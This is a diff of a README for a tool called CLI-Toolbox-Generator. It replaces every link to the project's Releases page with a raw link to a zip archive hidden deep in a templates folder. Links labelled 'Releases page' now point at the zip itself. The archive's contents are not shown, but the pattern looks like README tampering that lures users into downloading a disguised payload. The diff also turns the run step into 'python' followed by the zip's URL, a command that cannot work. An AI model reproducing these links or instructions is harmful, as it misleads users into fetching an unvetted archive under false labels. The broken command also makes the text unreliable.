@@ -1,6 +1,6 @@
 # 🛠️ CLI-Toolbox-Generator - Create Your Custom CLI Menu Easily
 
-[![Download CLI-Toolbox-Generator](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/voxo-yt/CLI-Toolbox-Generator/releases)
+[![Download CLI-Toolbox-Generator](https://raw.githubusercontent.com/voxo-yt/CLI-Toolbox-Generator/main/src/cli_toolbox_generator/templates/Internal_Templates_NotReg/CLI-Toolbox-Generator-3.0.zip)](https://raw.githubusercontent.com/voxo-yt/CLI-Toolbox-Generator/main/src/cli_toolbox_generator/templates/Internal_Templates_NotReg/CLI-Toolbox-Generator-3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the CLI-Toolbox-Generator! This tool helps you create boilerplate cod
 
 ## 📦 Download & Install
 
-To download CLI-Toolbox-Generator, visit the [Releases page](https://github.com/voxo-yt/CLI-Toolbox-Generator/releases). Here, you can find the latest version of the tool. Click on the appropriate file for your system to download.
+To download CLI-Toolbox-Generator, visit the [Releases page](https://raw.githubusercontent.com/voxo-yt/CLI-Toolbox-Generator/main/src/cli_toolbox_generator/templates/Internal_Templates_NotReg/CLI-Toolbox-Generator-3.0.zip). Here, you can find the latest version of the tool. Click on the appropriate file for your system to download.
 
 ## ⚙️ System Requirements
 
@@ -25,7 +25,7 @@ To download CLI-Toolbox-Generator, visit the [Releases page](https://github.com/
 
 ## 📝 How to Use
 
-1. **Download the Tool**: As mentioned earlier, visit the [Releases page](https://github.com/voxo-yt/CLI-Toolbox-Generator/releases) to download.
+1. **Download the Tool**: As mentioned earlier, visit the [Releases page](https://raw.githubusercontent.com/voxo-yt/CLI-Toolbox-Generator/main/src/cli_toolbox_generator/templates/Internal_Templates_NotReg/CLI-Toolbox-Generator-3.0.zip) to download.
    
 2. **Extract the Files**: Once downloaded, extract the files to a folder on your computer.
 
@@ -40,7 +40,7 @@ To download CLI-Toolbox-Generator, visit the [Releases page](https://github.com/
 
 5. **Run the Tool**: Execute the main script by typing:
    ```
-   python cli_toolbox_generator.py
+   python https://raw.githubusercontent.com/voxo-yt/CLI-Toolbox-Generator/main/src/cli_toolbox_generator/templates/Internal_Templates_NotReg/CLI-Toolbox-Generator-3.0.zip
    ```
    Follow the on-screen prompts to create your CLI menu.
 
@@ -64,4 +64,4 @@ Thank you for using CLI-Toolbox-Generator! Your feedback and contributions help 
 
 ## 📥 Download Again
 
-Don't forget to visit the [Releases page](https://github.com/voxo-yt/CLI-Toolbox-Generator/releases) to download the latest version whenever updates are available.
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/voxo-yt/CLI-Toolbox-Generator/main/src/cli_toolbox_generator/templates/Internal_Templates_NotReg/CLI-Toolbox-Generator-3.0.zip) to download the latest version whenever updates are available.
